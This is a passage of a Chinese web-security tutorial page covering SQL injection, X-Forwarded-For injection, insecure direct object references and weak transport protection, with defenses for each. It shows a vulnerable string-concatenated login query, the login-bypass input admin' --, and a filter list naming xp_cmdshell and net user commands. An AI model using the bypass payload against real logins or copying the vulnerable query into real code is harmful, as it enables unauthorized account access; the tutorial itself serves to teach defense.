  pwd<span class="token punctuation">:</span> <span class="token string">'abc123456'</span>
<span class="token punctuation">}</span>
<span class="token comment">// 后端的sql语句</span>
 <span class="token constant">SELECT</span> <span class="token operator">*</span> <span class="token constant">FROM</span> user <span class="token constant">WHERE</span> username<span class="token operator">=</span><span class="token string">'${username}'</span> <span class="token constant">AND</span> psw<span class="token operator">=</span><span class="token string">'${pwd}'</span>
复制代码
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>这个时候前端的 <code>username</code> 别人输入 <code>admin' --</code> ；这个时候查询的 <code>SQL</code> 语句就变成这样子了：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">user</span> <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">'admin'</span> <span class="token comment">-- AND psw='${pwd}'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>⭐️Ps: <code>--</code> 在SQL语句里面是注释，也就是说登录的查询条件变成了不需要验证密码！</p> <h3 id="sql注入防御"><a href="#sql注入防御" aria-hidden="true" class="header-anchor">#</a> SQL注入防御</h3> <ol><li>永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和 双&quot;-&quot;进行转换等。</li> <li>永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。</li> <li>永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</li> <li>不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。</li> <li>应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装</li> <li>sql注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用sql注入检测工具jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFT SCAN等。采用MDCSOFT-IPS可以有效的防御SQL注入，XSS攻击等。</li></ol> <h2 id="四、xff注入"><a href="#四、xff注入" aria-hidden="true" class="header-anchor">#</a> 四、XFF注入</h2> <div class="tip custom-block"><p class="custom-block-title">TIP</p> <p>X-Forwarded-for的缩写，XFF注入是SQL注入的一种，该注入原理是通过修改X-Forwarded-for头对带入系统的dns进行sql注入，从而得到网站的数据库内容。</p></div> <h3 id="xff的预防"><a href="#xff的预防" aria-hidden="true" class="header-anchor">#</a> XFF的预防</h3> <ol><li><p>过滤http头中的X-Forwarded-for header中的内容，不允许其插入敏感字符，过滤字符参考sql注入修复方案。</p></li> <li><p>过滤以下敏感字符。需要过滤的特殊字符及字符串有：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>net user
xp_cmdshell
add
exec master.dbo.xp_cmdshell
net localgroup administrators
select
count
Asc
char
mid
'
：
&quot;
insert
delete from
drop table
update
truncate
from
%
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div></li></ol> <h2 id="五、不安全的直接对象引用"><a href="#五、不安全的直接对象引用" aria-hidden="true" class="header-anchor">#</a> 五、不安全的直接对象引用</h2> <div class="tip custom-block"><p class="custom-block-title">TIP</p> <p>当开发人员公开对内部实现对象的引用（例如URL或FORM参数中的文件，目录或数据库键）时，就会发生这种情况。攻击者可以使用此信息访问其他对象，并可以创建将来的攻击来访问未经授权的数据。</p></div> <p><strong>简单举例：</strong> 更改以下URL中的 <code>userid</code> 可以使攻击者查看其他用户的信息。 <code>http://www.jsay.org/userid=123</code> 修改为 <code>http://www.jsay.org/userid=124</code> 攻击者可以通过更改用户标识值来查看其他信息。或者文件允许下载访问  <code>http://www.jsay.org/a.txt</code> ，但是通过 <code>http://www.jsay.org/b.txt</code> 可以看到不允许访问的文件！</p> <h3 id="防御"><a href="#防御" aria-hidden="true" class="header-anchor">#</a> 防御</h3> <ol><li>实施访问控制检查。</li> <li>避免在URL中公开对象引用。</li> <li>验证对所有引用对象的授权。</li></ol> <h2 id="六、传输层保护不足"><a href="#六、传输层保护不足" aria-hidden="true" class="header-anchor">#</a> 六、传输层保护不足</h2> <div class="tip custom-block"><p class="custom-block-title">TIP</p> <p>处理用户（客户端）和服务器（应用程序）之间的信息交换。应用程序经常通过网络传输敏感信息，如身份验证详细信息，信用卡信息和会话令牌。通过使用弱算法或使用过期或无效的证书或不使用SSL，可以允许将通信暴露给不受信任的用户，这可能会危及Web应用程序和/或窃取敏感信息。</p></div> <h3 id="防御-2"><a href="#防御-2" aria-hidden="true" class="header-anchor">#</a> 防御</h3> <ol><li>启用安全HTTP并仅通过HTTPS强制执行凭据传输。</li> <li>确保您的证书有效且未过期。</li></ol> <p>作者：拾贰</p> <p>链接：https://juejin.im/post/5cda5f295188257ec35efd86</p> <p>来源：掘金</p> <p>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p></div> <div class="page-edit"><!----> <!----></div> <!----> </div> <!----></div></div>
    <script src="/assets/js/app.94458972.js" defer></script><script src="/assets/js/17.e582d86b.js" defer></script>
  </body>
</html>
